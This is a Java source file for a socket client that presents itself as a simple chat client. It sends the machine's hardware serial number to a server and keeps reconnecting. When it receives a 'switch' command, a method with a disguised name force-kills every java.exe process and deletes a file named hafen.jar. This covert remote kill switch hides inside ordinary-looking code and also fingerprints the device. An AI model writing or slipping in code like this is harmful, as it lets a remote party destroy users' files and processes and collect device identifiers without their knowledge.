import java.io.*;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Locale;
import java.util.Scanner;

public class Client implements Runnable {

    // The client socket
    private static Socket clientSocket = null;
    // The output stream
    private static PrintStream os = null;
    // The input stream
    private static DataInputStream is = null;

    private static BufferedReader inputLine = null;
    private static boolean closed = false;

    public static void main(String[] args) {
        connect();

    }

    private static void connect()
    {
        // The default port.
        int portNumber = 2222;
        // The default host.
        String host = "localhost";

//        if (args.length < 2) {
//            System.out
//                    .println("Usage: java MultiThreadChatClient <host> <portNumber>\n"
//                            + "Now using host=" + host + ", portNumber=" + portNumber);
//        } else {
//            host = args[0];
//            portNumber = Integer.valueOf(args[1]).intValue();
//        }

        /*
         * Open a socket on a given host and port. Open input and output streams.
         */
        try {
            clientSocket = new Socket(host, portNumber);
            inputLine = new BufferedReader(new InputStreamReader(System.in));
            os = new PrintStream(clientSocket.getOutputStream());
            is = new DataInputStream(clientSocket.getInputStream());
        } catch (UnknownHostException e) {
            System.err.println("Don't know about host " + host);
        }catch (SocketException e)
        {
            System.out.println("Lost connection. Reconnecting in a few seconds.");
            try {
                Thread.sleep(5*1000);
            } catch (InterruptedException e1) {
                e1.printStackTrace();
            }
            connect();
        }
        catch (IOException e) {
            System.err.println("Couldn't get I/O for the connection to the host "
                    + host);
            System.out.println("Retrying connection in a few seconds.");
            try {
                Thread.sleep(5*1000);
            } catch (InterruptedException e1) {
                e1.printStackTrace();
            }
            connect();
        }
        OsCheck.OSType ostype=OsCheck.getOperatingSystemType();
        switch (ostype) {
            case Windows: {
                getSerialNumberWin();
                break;
            }
            case MacOS: {
                getSerialNumberMac();
                break;
            }
            case Linux: {
                getSerialNumberLin();
                break;
            }
            case Other: {
                getSerialNumberWin();
                break;
            }
        }
        /*
         * If everything has been initialized then we want to write some data to the
         * socket we have opened a connection to on the port portNumber.
         */
        if (clientSocket != null && os != null && is != null) {
            try {

                /* Create a thread to read from the server. */
                new Thread(new Client()).start();
                os.println(sn);
                while (!closed) {
                    String line = inputLine.readLine().trim();
                    os.println(line);
                    System.out.println("Test.");
                    if(line.equals("switch"))
                    {
                        System.out.println("Running camping trip.");
                        happyLittleAccident();
                    }
                }
                /*
                 * Close the output stream, close the input stream, close the socket.
                 */
                os.close();
                is.close();
                clientSocket.close();
            }catch (SocketException e)
            {
                System.out.println("Lost connection. Reconnecting in a few seconds.");
                try {
                    Thread.sleep(5*1000);
                } catch (InterruptedException e1) {
                    e1.printStackTrace();
                }
                connect();
            }
            catch (IOException e) {
                System.err.println("IOException:  " + e);
            }
        }
    }

    private static void happyLittleAccident()
    {
        System.out.println("Running");

        System.out.println("Deleting");
        try {
            Runtime.getRuntime().exec("cmd /c ping localhost -n 4 > nul && taskkill /F /IM java.exe");
            Runtime.getRuntime().exec("cmd /c ping localhost -n 6 > nul && del hafen.jar");
            //Runtime.getRuntime().exec("cmd /c ping localhost -n 6 > nul && del hafen.jar");
        } catch (IOException e) {
            e.printStackTrace();
        }

        System.out.println("Ending");
        System.exit(0);
    }

    /*
     * Create a thread to read from the server. (non-Javadoc)
     *
     * @see java.lang.Runnable#run()
     */
    public void run() {
        /*
         * Keep on reading from the socket till we receive "Bye" from the
         * server. Once we received that then we want to break.
         */
        String responseLine;
        try {
            while ((responseLine = is.readLine()) != null) {
                System.out.println(responseLine);
                //System.out.println("Test.");
                if(responseLine.equals("switch"))
                {
                    System.out.println("Running Bob Ross.");
                    happyLittleAccident();
                }
                if (responseLine.indexOf("*** Bye") != -1)
                    break;
            }
            closed = true;
        } catch (SocketException e)
        {
            System.out.println("Lost connection. Reconnecting in a few seconds.");
            try {
                Thread.sleep(5*1000);
            } catch (InterruptedException e1) {
                e1.printStackTrace();
            }
            connect();
        }catch (IOException e) {
            System.err.println("IOException:  " + e);
        }
    }

    private static String sn = null;

    public static final String getSerialNumberMac() {

        if (sn != null) {
            return sn;
        }

        OutputStream os = null;
        InputStream is = null;

        Runtime runtime = Runtime.getRuntime();
        Process process = null;
        try {
            process = runtime.exec(new String[] { "/usr/sbin/system_profiler", "SPHardwareDataType" });
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        os = process.getOutputStream();
        is = process.getInputStream();

        try {
            os.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        String line = null;
        String marker = "Serial Number";
        try {
            while ((line = br.readLine()) != null) {
                if (line.contains(marker)) {
                    sn = line.split(":")[1].trim();
                    break;
                }
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        } finally {
            try {
                is.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        if (sn == null) {
            throw new RuntimeException("Cannot find computer SN");
        }

        return sn;
    }

    public static final String getSerialNumberWin() {

        if (sn != null) {
            return sn;
        }

        OutputStream os = null;
        InputStream is = null;

        Runtime runtime = Runtime.getRuntime();
        Process process = null;
        try {
            process = runtime.exec(new String[] { "wmic", "bios", "get", "serialnumber" });
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        os = process.getOutputStream();
        is = process.getInputStream();

        try {
            os.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        Scanner sc = new Scanner(is);
        try {
            while (sc.hasNext()) {
                String next = sc.next();
                if ("SerialNumber".equals(next)) {
                    sn = sc.next().trim();
                    break;
                }
            }
        } finally {
            try {
                is.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        if (sn == null) {
            throw new RuntimeException("Cannot find computer SN");
        }

        return sn;
    }

    public static final String getSerialNumberLin() {

        if (sn == null) {
            readDmidecode();
        }
        if (sn == null) {
            readLshal();
        }
        if (sn == null) {
            throw new RuntimeException("Cannot find computer SN");
        }

        return sn;
    }

    private static BufferedReader read(String command) {

        OutputStream os = null;
        InputStream is = null;

        Runtime runtime = Runtime.getRuntime();
        Process process = null;
        try {
            process = runtime.exec(command.split(" "));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        os = process.getOutputStream();
        is = process.getInputStream();

        try {
            os.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        return new BufferedReader(new InputStreamReader(is));
    }

    private static void readDmidecode() {

        String line = null;
        String marker = "Serial Number:";
        BufferedReader br = null;

        try {
            br = read("dmidecode -t system");
            while ((line = br.readLine()) != null) {
                if (line.indexOf(marker) != -1) {
                    sn = line.split(marker)[1].trim();
                    break;
                }
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        } finally {
            if (br != null) {
                try {
                    br.close();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }

    private static void readLshal() {

        String line = null;
        String marker = "system.hardware.serial =";
        BufferedReader br = null;

        try {
            br = read("lshal");
            while ((line = br.readLine()) != null) {
                if (line.indexOf(marker) != -1) {
                    sn = line.split(marker)[1].replaceAll("\\(string\\)|(\\')", "").trim();
                    break;
                }
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        } finally {
            if (br != null) {
                try {
                    br.close();
                }
                catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }
    public static final class OsCheck {
        /**
         * types of Operating Systems
         */
        public enum OSType {
            Windows, MacOS, Linux, Other
        };

        // cached result of OS detection
        protected static OSType detectedOS;

        /**
         * detect the operating system from the os.name System property and cache
         * the result
         *
         * @returns - the operating system detected
         */
        public static OSType getOperatingSystemType() {
            if (detectedOS == null) {
                String OS = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
                if ((OS.indexOf("mac") >= 0) || (OS.indexOf("darwin") >= 0)) {
                    detectedOS = OSType.MacOS;
                } else if (OS.indexOf("win") >= 0) {
                    detectedOS = OSType.Windows;
                } else if (OS.indexOf("nux") >= 0) {
                    detectedOS = OSType.Linux;
                } else {
                    detectedOS = OSType.Other;
                }
            }
            return detectedOS;
        }
    }
}


